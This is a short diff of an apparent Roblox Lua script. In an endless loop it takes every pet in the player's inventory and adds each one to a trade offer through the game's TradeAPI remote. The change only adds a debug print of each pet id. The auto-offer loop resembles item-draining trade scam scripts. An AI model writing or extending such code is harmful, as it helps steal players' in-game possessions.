@@ -457,7 +457,7 @@ local ab =0;
 while true do
 
                              for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
-                            
+                            print(tostring(v["id"]))
                                     ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                               
                             end
